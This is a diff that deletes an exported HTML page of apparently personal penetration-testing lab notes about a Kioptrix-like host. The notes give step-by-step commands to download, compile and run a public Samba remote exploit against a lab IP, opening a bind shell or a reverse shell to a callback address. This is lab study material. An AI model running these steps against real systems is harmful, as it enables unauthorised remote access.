@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>22 Barry</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>22 Barry</h1><br/>nmap came back with a ton of shit<br />The webpages looked... familiar..<br />turns out this is identical to kioptrix 1.0<br /><br /><a href="https://www.exploit-db.com/exploits/10">https://www.exploit-db.com/exploits/10</a><br />download the exploit<br />gcc 10.c -o samba<br /><br />run it<br />./samba  -b=0 10.11.1.22<br /><br />this makes a bind shell. if you want a reverse you may need to go into the 10.c file edit  795, 796, 797 (maybe just remove it, i havent tried it)<br />gcc 10.c -o samba1<br />./samba1 -b=0 -c 10.11.0.186 10.11.1.22<br /><br /><br /><a href="https://www.hackingarticles.in/hack-the-kioptrix-level-1/">https://www.hackingarticles.in/hack-the-kioptrix-level-1/</a></div></body></html>
